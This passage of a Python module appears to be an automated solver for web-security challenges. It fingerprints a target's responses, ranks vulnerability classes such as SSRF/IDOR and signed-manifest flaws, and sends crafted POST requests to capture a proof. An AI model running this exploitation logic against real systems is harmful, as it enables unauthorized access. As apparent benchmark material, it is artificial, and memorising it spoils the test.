    feature = _route_value(clues, ("feature_route", "activate_route", "update_route"), base_url)
    route_allowed = ctx.get("route_allowed")
    restricted = _restricted_hook(policy)
    bodies = [body for body in (_safe_manifest(row, restricted) for row in _updates(updates_doc)) if body]
    if (not feature or not callable(route_allowed) or not bool(route_allowed(feature))
            or not restricted or len(bodies) != 1):
        return None
    client = ctx.get("client")
    if client is None or not _can_send(ctx):
        return None
    requests = 0
    local_baselines = list(baselines)
    control = cache.get(feature)
    if control is None:
        control = _response(client.get(feature, allow_redirects=False))
        requests += 1
    if control is not None:
        local_baselines.append(_baseline_text(control))
    payload = json.dumps(bodies[0], separators=(",", ":"), ensure_ascii=False)
    if len(payload.encode("utf-8")) > MAX_BODY_BYTES or not _can_send(ctx):
        return {"proof": None, "requests": requests, "posts": 0, "terminal": False,
                "success": False, "class": "signed_manifest",
                "baseline_proofs": _baseline_proofs(local_baselines)}
    response = _response(client.request(
        "POST", feature, data=payload,
        headers={"Content-Type": "application/json"}, allow_redirects=False,
    ))
    requests += 1
    meta = _proof_meta(response, local_baselines, _origin_host(base_url), anchored=True)
    return {"proof": meta.get("auto"), "requests": requests, "posts": 1,
            "terminal": True, "success": bool(meta.get("success")),
            "class": "signed_manifest", "candidates": list(meta.get("candidates") or [])[:12],
            "baseline_incomplete": bool(meta.get("baseline_incomplete")),
            "baseline_proofs": _baseline_proofs(local_baselines)}


def solve(target, ctx=None):
    """Fingerprint cached discovery responses, dispatch the highest exact class, return one proof or None."""
    ctx = dict(ctx or {})
    target = dict(target or {})
    aid = str(target.get("answer_id") or "target")
    sink = ctx.get("result_sink") if isinstance(ctx.get("result_sink"), dict) else {}
    base_url = str(target.get("url") or "")
    cache = _preloaded(ctx, base_url)
    docs = _documents(cache)
    baselines = [str(value) for value in list(ctx.get("baseline_texts") or [])[:120]]
    ranked = fingerprint(cache, prompt=ctx.get("prompt"), base_url=base_url,
                         discovery_routes=ctx.get("discovery_routes"))
    plan = dispatch_plan(ranked)
    findings = [{"class": row["class"], "confirmed": row["score"] >= 100,
                 "evidence": row["evidence"], "note": "recon-router"}
                for row in ranked]
    summary = {"requests": 0, "posts": 0, "success": False, "terminal": False,
               "class": None, "ranked": ranked, "dispatch_plan": plan,
               "findings": findings, "candidates": []}
    sink[aid] = summary
    if not ranked or not _can_send(ctx):
        return None

    # Exact classes outrank textual hints.  Both contracts are structural and
    # independently revalidated by their exploit function before a send.
    exact = [row["class"] for row in plan
             if row["mode"] == "exact" and row["score"] >= 100]
    total_requests = total_posts = 0
    for name in exact:
        if name == "ssrf_idor":
            result = _ssrf_idor(target, ctx, cache, docs, baselines)
        elif name == "signed_manifest":
            result = _signed_manifest(target, ctx, cache, docs, baselines)
        else:
            continue
        if result is None:
            continue
        try:
            total_requests += max(0, int(result.get("requests") or 0))
            total_posts += max(0, int(result.get("posts") or 0))
        except (TypeError, ValueError, OverflowError):
            total_requests = max(total_requests, 0)
        summary.update({key: value for key, value in result.items() if key != "proof"})
        summary["requests"] = total_requests
        summary["posts"] = total_posts
        summary["ranked"] = ranked
        summary["dispatch_plan"] = plan
        summary["findings"] = findings
        sink[aid] = summary
        proof = result.get("proof")
        if proof:
            return proof
        # A clean GET-only miss is safe to fall through to the next exact
        # structural contract.  Ambiguous proof evidence, a closed budget, or
        # any stateful transition is terminal and must never be retried under a
        # different class interpretation.
        if (result.get("terminal") or result.get("posts")
                or result.get("candidates") or result.get("baseline_incomplete")
                or str(result.get("stopped") or "").lower() in {
                    "deadline", "max_requests", "stopped",
                }):
            return None
    return None


__all__ = ["DISPATCH_PLAN", "dispatch_plan", "fingerprint", "solve"]
